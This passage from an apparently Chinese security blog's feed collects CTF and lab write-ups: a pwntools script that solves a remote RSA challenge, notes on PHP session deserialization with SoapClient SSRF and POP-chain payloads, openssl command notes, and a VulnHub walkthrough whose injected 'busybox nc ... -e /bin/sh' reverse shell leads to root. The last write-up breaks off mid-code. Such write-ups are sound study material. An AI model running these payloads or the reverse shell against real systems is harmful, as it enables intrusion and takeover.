<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26182</span>)</span><br><span class="line">r.recvuntil(<span class="string">"hexdigest()="</span>)</span><br><span class="line">digest = r.recvline()</span><br><span class="line">r.recvuntil(<span class="string">"'hex')="</span>)</span><br><span class="line">skr5 = r.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span><span class="params">(skr5, digest)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>*<span class="number">256</span>*<span class="number">256</span>, <span class="number">256</span>*<span class="number">256</span>*<span class="number">256</span>):</span><br><span class="line">        result = hashlib.sha256(skr5.decode(<span class="string">'hex'</span>) + long_to_bytes(i)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> result == digest:</span><br><span class="line">            print(<span class="string">"found it!"</span>)</span><br><span class="line">            <span class="keyword">return</span> ((skr5.decode(<span class="string">'hex'</span>)+long_to_bytes(i)).encode(<span class="string">'hex'</span>))</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">skr = proof(skr5, digest)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">r.sendline(skr)</span><br><span class="line"><span class="comment"># r.interactive()</span></span><br><span class="line"></span><br><span class="line">x0 = <span class="number">0x35343237323432377dL</span></span><br><span class="line">m_high = <span class="number">2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736</span></span><br><span class="line">ans1 = long_to_bytes(x0 + m_high).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">r.sendline(ans1)</span><br><span class="line"></span><br><span class="line">p = <span class="number">97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560661715295741651653499691458486798196487</span></span><br><span class="line">q = <span class="number">131093675711613661161476275473445206682597559447006571385482255727609238786596952165801814021602699749876712682307789568113374768689632642728986573211776526473651771104432443501294668372441525987174391472994271054873305324343666279426741897612827889525440428582592216151586138881806196331920758968403508531637</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c = <span class="number">627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778</span></span><br><span class="line">d = gmpy2.invert(e, (q<span class="number">-1</span>)*(p<span class="number">-1</span>))</span><br><span class="line">m = long_to_bytes(pow(c, d, p*q)).encode(<span class="string">'hex'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">r.sendline(m)</span><br><span class="line"></span><br><span class="line">d = <span class="number">61931015986410954522379841763963945834108214123439860201390512063842165571430799255094107119082046571341221952786658415661511901536119262974324197242727901361853519060099176095718398341546521709753140715090423775413590463159715914497625346364363050316931779727154988269576808476796380941227956316802411370267</span></span><br><span class="line">n=<span class="number">92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span></span><br><span class="line">c=<span class="number">56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span></span><br><span class="line">m = long_to_bytes(pow(c, d, n)).encode(<span class="string">'hex'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">r.sendline(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">2519188594271759205757864486234199030368509477419996746572813835802776507456368520243429255706508061522045</span></span><br><span class="line">m = long_to_bytes(m).encode(<span class="string">'hex'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">r.sendline(m)</span><br><span class="line"></span><br><span class="line">m = <span class="string">"464c41477b325e3872736133393863663864663763323636363162623763623635623262396661653235657d"</span></span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">r.sendline(m)</span><br><span class="line"></span><br><span class="line">d = <span class="number">776765455081795377117377680209510234887230129318575063382634593357724998207571</span></span><br><span class="line">c=<span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L</span></span><br><span class="line"></span><br><span class="line">m = long_to_bytes(pow(c,d,n)).encode(<span class="string">'hex'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">r.sendline(m)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/71177333-c009ba80-22a6-11ea-96ae-27f501d40c06.png" alt="image"></p>
]]></content>
  </entry>
  <entry>
    <title>php的两类反序列化</title>
    <url>/2019/09/02/php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:</p>
<h2 id="session反序列化漏洞">session反序列化漏洞</h2>
<ul>
<li>特征
<ul>
<li>phpinfo中默认的session.serialize_handler和本地的值不一样</li>
<li>ini_set(‘session.serialize_handler’, ‘php’);之类的</li>
<li>phpinfo中session.upload_progress.enabled打开</li>
</ul>
</li>
</ul>
<p>一旦发现脚本中的序列化处理器和php.ini设置的不一样,就可能导致这个漏洞.</p>
<p>php用于存取session时候的三种处理器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:键名 ＋ 竖线 ＋ 序列化字符串</span><br><span class="line">php_binary: 键名的长度对应的 ASCII 字符 ＋ 键名 ＋序列化字符串</span><br><span class="line">php_serialize: 序列化字符串</span><br></pre></td></tr></table></figure>
<p>如果以php_serialize 方式存取但是又用php处理器去处理, 那么只要传入的字符串中有 | 就可以导致php处理器将 | 前的东东解释成键, 而将后面的东西解释称值, 而后面的东西一般就是要反序列化的字符串了.</p>
<blockquote>
<p>php5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session, 所以这个洞要看版本</p>
</blockquote>
<p>将payload传入session的方式有两种, 一种是对面开放本地可控的数据, 另一种是因为配置不当造成session可控</p>
<blockquote>
<p>当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$<em>SESSION中。</em></p>
<p>_当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，<br>
当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
</blockquote>
<p>上传表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中目标网址需要替换, php_session_upload_progress是session.upload_progress.name的名字, 从phpinfo中看.</p>
<p>然后随便传点什么进去. 在burpsuite中做如下修改</p>
<p>将随便传的文件的filename成payload, 比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这里的斜杆是为了防止转义.签名的竖线就是帮助php处理器解释使用的.</p>
<h2 id="例题LCTF2018-bestphp’s-revenge">例题LCTF2018-bestphp’s revenge</h2>
<p>题目直接给出了源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line"></span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>整理一下</p>
<ul>
<li>
<p>call_user_func: 第一个参数是回调函数的名字,第二个之后的参数是回调函数的参数,<strong>特别的,如果传入的是一个数组的话,他会将数组的第一项识别为类和对象,并将之后的参数作为类和对象的方法来调用</strong>.</p>
</li>
<li>
<p>reset会将数组的第一项作为字符串输出</p>
</li>
<li>
<p>implode 函数只是合并数组的时候插入一些给定字符而已,无关紧要.</p>
</li>
</ul>
<p>扫描目录发现了flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>规定localhost访问,那么必须要找到ssrf的机会.</p>
<p>题目提示反序列化,但是题目源码中没有任何给定的类,在此情况下只能考虑php的原生类.本题采用的是SoapClient类.在这个类的对象调用未知的方法时候就会调用call函数,同时触发请求,这个类支持http/https, 简单的使用实例如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://127.0.0.1:12334/flag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $url, <span class="string">'location'</span> =&gt;$url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$c = unserialize($a);</span><br><span class="line">$c-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>nc 接受:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/66317782-bc73c200-e94c-11e9-904b-6e9705595d94.png" alt="image"></p>
<p>那么可以这样子:</p>
<ul>
<li>call_user_func(‘session_start’,‘serialize_handler=php_serialize’)提前开启php session并规定好本地的serialize_handler为php_serialize, 而默认的session序列化处理器为php,这就会导致上面说到的session反序列化漏洞.当然,name的值是竖线加上SoapClient序列化字符串,uri和location的值都指向flag.php</li>
<li>session存取完成之后就要想办法去反序列化和触发未知方法,这里使用变量覆盖(<strong>extract</strong>)将b覆盖为call_user_func,因为b有机会接受session反序列化的字符串,并将数组传入b中,调用welcome_to_the_lctf2018方法,从而触发call函数,造成ssrf</li>
<li>最后<strong>ssrf的结果也会存放在sessoin中</strong>,所以获取SoapClient的PHPSSID并去访问index.php(里面有var_dump(session))得到flag</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/66320601-baf8c880-e951-11e9-8a3f-1bf39a2f08ed.png" alt="1570458197732"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/66320574-a7e5f880-e951-11e9-9f5f-05bddd51af9b.png" alt="1570458295931"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/66320472-78cf8700-e951-11e9-85b2-8f9b18fc9b9d.png" alt="image"></p>
<h2 id="SWPUCTF-2019-web6">SWPUCTF 2019 web6</h2>
<p>前面部分省略, 来到源码部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ssrf生成session反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>=&gt;<span class="string">'aabb'</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">// echo urlencode($a);</span></span><br></pre></td></tr></table></figure>
<p>序列化生成, 触发反序列化后进而触发session的反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$first = <span class="keyword">new</span> bb();</span><br><span class="line">$second = <span class="keyword">new</span> aa();</span><br><span class="line">$third = <span class="keyword">new</span> cc();</span><br><span class="line">$four = <span class="keyword">new</span> ee();</span><br><span class="line">$first -&gt;mod1 = $second;</span><br><span class="line">$third -&gt; mod1 = $four;</span><br><span class="line">$f = <span class="keyword">new</span> dd();</span><br><span class="line">$f-&gt;flag=<span class="string">'Get_flag'</span>;</span><br><span class="line">$f-&gt;b=<span class="string">'call_user_func'</span>;</span><br><span class="line">$four -&gt; str1 = $f;</span><br><span class="line">$four -&gt; str2 = <span class="string">"getflag"</span>;</span><br><span class="line">$second -&gt;mod2[<span class="string">'test2'</span>] = $third;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($first);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>PHPSESSID随便指定写一个比如kk默认情况下会生成sess_kk session文件</p>
</blockquote>
<p><img src="https://user-images.githubusercontent.com/40637063/70534832-dae97a00-1b96-11ea-9edf-1ce93b617b9d.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70534582-54349d00-1b96-11ea-9028-3d08bb6c72c2.png" alt="image"></p>
<p>参考</p>
<p><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-详细题解/</a></p>
<p><a href="http://www.91ri.org15925.html" target="_blank" rel="noopener">http://www.91ri.org15925.html</a></p>
<p><a href="https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO" target="_blank" rel="noopener">https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO</a></p>
<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>openssl笔记</title>
    <url>/2019/09/01/openssl%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="信息提取">信息提取</h2>
<p>生成一个包含密钥和公钥的文件,既可以用来加密也可以用来解密.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out target.key 1024</span><br></pre></td></tr></table></figure>
<p>从这个包含公钥和私钥的文件中提取出公钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -in target.key -pubout -out target_pub.key</span><br></pre></td></tr></table></figure>
<p>从公钥中提取rsa公钥信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in (filename) -text</span><br></pre></td></tr></table></figure>
<p>提取其中模数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in (filename) -text -modulus</span><br></pre></td></tr></table></figure>
<h2 id="加密解密">加密解密</h2>
<p>公钥加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -encrypt -in target -out target.enc -inkey target_pub.pem -pubin</span><br></pre></td></tr></table></figure>
<p>私钥解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in target.enc -out target -inkey target_pri.pem</span><br></pre></td></tr></table></figure>
<p>用三种填充方式解密,(第一种没有填充)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec</span><br><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec -oaep</span><br><span class="line">openssl rsautl -decrypt -in flag.enc-inkey private.key -out flag.dec -pkcs</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>minuv1靶机渗透记录(存疑)</title>
    <url>/2019/04/22/minuv1%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>在这次靶机渗透过程中有很多存疑的地方，特别是<code>tty</code>的获得那一块，网上有很多不同的解法，但是其原理还需细细探索。</p>
<p>首先使用<code>netdiscover</code>发现靶机，<code>nmap</code>扫描端口，访问无特别信息。</p>
<p>使用github上的<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>来扫描目录（我用kali自带的dirb没有扫到），发现<code>text.php</code>。</p>
<p>访问并点击链接，关注<code>url：http://192.168.43.83/test.php?file=last.html</code>。</p>
<ul>
<li>猜测1：正常的文件访问
<ul>
<li>file参数改成/etc/passwd，访问失败</li>
</ul>
</li>
<li>猜测2：命令执行，通过cat之类的命令来访问，命令之间用分号分隔
<ul>
<li>file参数为file=last.html;whoami访问失败</li>
<li>file参数为file=last.html;id访问成功<br>
但是在尝试反弹<code>shell（nc、/bin/nc、netcat、/bin/netcat）</code>的时候失败了，这里有一个<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">绕过安全策略的网站</a>，收集了执行命令的方法。</li>
</ul>
</li>
</ul>
<p>于是<code>file=a;busybox nc 192.169.43.211 4444 -e /bin/sh -i</code>，同时攻击机上运行<code>nc -lvp 4444</code></p>
<p>然后拿到了shell,进入<code>/home/bob</code>目录发现<code>._pw_</code>文件，里面有一串<code>jwt</code><a href="https://www.vaadata.com/blog/jwt-tokens-and-security-working-principles-and-use-cases/" target="_blank" rel="noopener">josn web<br>
tocken</a>,然后github上有一个脚本来破解其中的secret-key：<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">工具链接</a>,跑完后得到<code>secretkey</code>。</p>
<hr>
<p>从这里开始涉及知识盲区了，尝试用<code>secretkey</code>去登陆<code>bob</code>和<code>root</code>（这个有点脑洞）。但是这不是<code>tty shell</code>，所以不能直接执行su命令，因为会让你输入密码。</p>
<p>考虑到权限的问题，将目录切换到<code>/tmp</code>下，在这里所有用户都有完整的读写权限。然后执行<code>script -c &quot;/bin/bash&quot;</code>,这样就来到了<code>bash</code>环境中，然后用<code>su</code>命令，能成功登陆root用户，提权成功。</p>
<p><img src="http://ww1.sinaimg.cn/large/0062HBMaly1g13iqh4iexj30p30fmmz0.jpg" alt></p>
<p>但是关于ttyshell的知识还是比较模糊，需要再找找资料。</p>
<p>参考文章：</p>
<p><a href="https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939" target="_blank" rel="noopener">https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939</a></p>
<p><a href="https://0x10f8.wordpress.com/2018/09/15/vulnhub-minuv1-ctf/" target="_blank" rel="noopener">https://0x10f8.wordpress.com/2018/09/15/vulnhub-minuv1-ctf/</a></p>
]]></content>
      <categories>
        <category>靶机渗透</category>
      </categories>
  </entry>
  <entry>
    <title>Hackinos Penetration</title>
    <url>/2019/05/03/Hackinos-Penetration/</url>
    <content><![CDATA[<h2 id="hackinos-from-vulhub">hackinos from vulhub</h2>
<p>this time , I tried to follow chailao’s steps to break the target-shooting machine and of course, learned a lot 😃</p>
<p>first, use <code>sudo netdiscover</code> or <code>sudo arp-scan -l</code> to discover the machine.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022143-d7852c00-6c60-11e9-8f8a-ccb35b4f5a6e.png" alt="Screenshot from 2019-05-01 22-25-32"></p>
<p>then , use <code>nmap -sV -p- {ip}</code> to verify the ports open to us.</p>
<blockquote>
<p>-sV: Probe open ports to determine service/version info</p>
</blockquote>
<p>and here we got:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022147-d94eef80-6c60-11e9-8ec0-0e8dadc0db10.png" alt="Screenshot from 2019-05-01 22-26-05"></p>
<p>next , check the web site and discover that it was made by <code>wordpress</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022161-dfdd6700-6c60-11e9-9128-b8a4a54ce9d3.png" alt="Screenshot from 2019-05-01 22-27-21"><br>
and try to implement a scan to it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022150-dbb14980-6c60-11e9-8e51-5145b102b578.png" alt="Screenshot from 2019-05-01 22-28-33"></p>
<p>here we find <code>robot.txt</code>, which contains something as follows:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022155-dce27680-6c60-11e9-9347-f4fc67860a6c.png" alt="Screenshot from 2019-05-01 22-30-17"></p>
<p>so, get to upload.php and check the source code…there is a link where you can find the source code of php page.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;b&gt;Select image : &lt;/b&gt; </span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> style=<span class="string">"border: solid;"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">	$rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">	$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">	$target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">	$file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">	$uploadOk = <span class="number">1</span>;</span><br><span class="line">	$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">	$type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">	$check = getimagesize($_FILES[<span 